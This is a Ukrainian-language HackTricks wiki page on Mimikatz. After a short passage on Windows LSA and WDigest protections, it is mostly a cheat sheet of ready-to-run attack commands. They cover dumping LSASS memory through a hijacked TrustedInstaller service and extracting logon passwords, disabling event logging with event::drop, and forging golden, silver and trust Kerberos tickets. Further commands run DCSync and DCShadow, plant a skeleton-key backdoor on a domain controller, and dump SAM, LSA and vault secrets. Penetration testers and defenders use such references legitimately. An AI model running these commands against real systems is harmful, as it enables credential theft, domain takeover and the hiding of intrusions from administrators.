# Mimikatz

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}


**Ця сторінка базується на одній з [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Перевірте оригінал для отримання додаткової інформації!

## LM та відкритий текст в пам'яті

З Windows 8.1 та Windows Server 2012 R2 впроваджено значні заходи для захисту від крадіжки облікових даних:

- **LM хеші та паролі у відкритому тексті** більше не зберігаються в пам'яті для підвищення безпеки. Специфічне налаштування реєстру, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ повинно бути налаштоване з DWORD значенням `0`, щоб вимкнути Digest Authentication, забезпечуючи, що "паролі у відкритому тексті" не кешуються в LSASS.

- **Захист LSA** введено для захисту процесу Local Security Authority (LSA) від несанкціонованого читання пам'яті та ін'єкції коду. Це досягається шляхом позначення LSASS як захищеного процесу. Активація захисту LSA передбачає:
1. Модифікацію реєстру в _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_, встановивши `RunAsPPL` на `dword:00000001`.
2. Впровадження об'єкта групової політики (GPO), який забезпечує цю зміну реєстру на керованих пристроях.

Незважаючи на ці заходи, такі інструменти, як Mimikatz, можуть обійти захист LSA, використовуючи специфічні драйвери, хоча такі дії, ймовірно, будуть зафіксовані в журналах подій.

### Протидія видаленню SeDebugPrivilege

Адміністратори зазвичай мають SeDebugPrivilege, що дозволяє їм налагоджувати програми. Цю привілегію можна обмежити, щоб запобігти несанкціонованим дампам пам'яті, що є поширеною технікою, яку використовують зловмисники для витягування облікових даних з пам'яті. Однак, навіть з видаленою цією привілегією, обліковий запис TrustedInstaller все ще може виконувати дампи пам'яті, використовуючи налаштовану конфігурацію служби:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Це дозволяє вивантажити пам'ять `lsass.exe` у файл, який потім можна проаналізувати на іншій системі для витягнення облікових даних:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Зловживання журналами подій у Mimikatz включає дві основні дії: очищення журналів подій та патчинг служби подій, щоб запобігти реєстрації нових подій. Нижче наведені команди для виконання цих дій:

#### Clearing Event Logs

- **Command**: Ця дія спрямована на видалення журналів подій, ускладнюючи відстеження злочинних дій.
- Mimikatz не надає прямої команди в своїй стандартній документації для очищення журналів подій безпосередньо через командний рядок. Однак маніпуляції з журналами подій зазвичай включають використання системних інструментів або скриптів поза Mimikatz для очищення конкретних журналів (наприклад, використовуючи PowerShell або Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Ця експериментальна команда призначена для зміни поведінки служби реєстрації подій, ефективно запобігаючи їй реєструвати нові події.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- Команда `privilege::debug` забезпечує, щоб Mimikatz працював з необхідними привілеями для зміни системних служб.
- Команда `event::drop` потім патчить службу реєстрації подій.


### Kerberos Ticket Attacks

### Golden Ticket Creation

Золотий квиток дозволяє для доступу до домену під виглядом іншого користувача. Ключова команда та параметри:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Ім'я домену.
- `/sid`: Ідентифікатор безпеки (SID) домену.
- `/user`: Ім'я користувача, під виглядом якого потрібно діяти.
- `/krbtgt`: NTLM хеш облікового запису служби KDC домену.
- `/ptt`: Безпосередньо впроваджує квиток у пам'ять.
- `/ticket`: Зберігає квиток для подальшого використання.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Створення срібного квитка

Срібні квитки надають доступ до конкретних сервісів. Ключова команда та параметри:

- Команда: Схожа на Золотий квиток, але націлена на конкретні сервіси.
- Параметри:
- `/service`: Сервіс, на який націлюється (наприклад, cifs, http).
- Інші параметри схожі на Золотий квиток.

Приклад:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets використовуються для доступу до ресурсів між доменами, використовуючи довірчі відносини. Ключова команда та параметри:

- Команда: Схожа на Golden Ticket, але для довірчих відносин.
- Параметри:
- `/target`: Повне доменне ім'я цільового домену.
- `/rc4`: NTLM хеш для довірчого облікового запису.

Приклад:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Додаткові команди Kerberos

- **Список квитків**:
- Команда: `kerberos::list`
- Перераховує всі квитки Kerberos для поточної сесії користувача.

- **Передати кеш**:
- Команда: `kerberos::ptc`
- Впроваджує квитки Kerberos з кеш-файлів.
- Приклад: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Передати квиток**:
- Команда: `kerberos::ptt`
- Дозволяє використовувати квиток Kerberos в іншій сесії.
- Приклад: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Очищення квитків**:
- Команда: `kerberos::purge`
- Очищає всі квитки Kerberos з сесії.
- Корисно перед використанням команд маніпуляції квитками, щоб уникнути конфліктів.


### Підробка Active Directory

- **DCShadow**: Тимчасово змусити машину діяти як DC для маніпуляції об'єктами AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Імітувати DC для запиту даних паролів.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Доступ до облікових даних

- **LSADUMP::LSA**: Витягти облікові дані з LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Імітувати DC, використовуючи дані пароля облікового запису комп'ютера.
- *У оригінальному контексті не надано конкретної команди для NetSync.*

- **LSADUMP::SAM**: Доступ до локальної бази даних SAM.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Розшифрувати секрети, збережені в реєстрі.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Встановити новий NTLM хеш для користувача.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Отримати інформацію про аутентифікацію довіри.
- `mimikatz "lsadump::trust" exit`

### Різне

- **MISC::Skeleton**: Впровадити бекдор в LSASS на DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Підвищення привілеїв

- **PRIVILEGE::Backup**: Отримати права на резервне копіювання.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Отримати привілеї налагодження.
- `mimikatz "privilege::debug" exit`

### Витягування облікових даних

- **SEKURLSA::LogonPasswords**: Показати облікові дані для користувачів, які увійшли в систему.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Витягти квитки Kerberos з пам'яті.
- `mimikatz "sekurlsa::tickets /export" exit`

### Маніпуляція SID та токенами

- **SID::add/modify**: Змінити SID та SIDHistory.
- Додати: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Змінити: *У оригінальному контексті не надано конкретної команди для зміни.*

- **TOKEN::Elevate**: Імітувати токени.
- `mimikatz "token::elevate /domainadmin" exit`

### Терминальні служби

- **TS::MultiRDP**: Дозволити кілька RDP сесій.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Перерахувати сесії TS/RDP.
- *У оригінальному контексті не надано конкретної команди для TS::Sessions.*

### Сховище

- Витягти паролі з Windows Vault.
- `mimikatz "vault::cred /patch" exit`


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Поглибте свої знання в **Мобільній безпеці** з 8kSec Academy. Опануйте безпеку iOS та Android через наші курси з самостійним навчанням та отримайте сертифікат:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
Вчіться та практикуйте Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вчіться та практикуйте Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримка HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
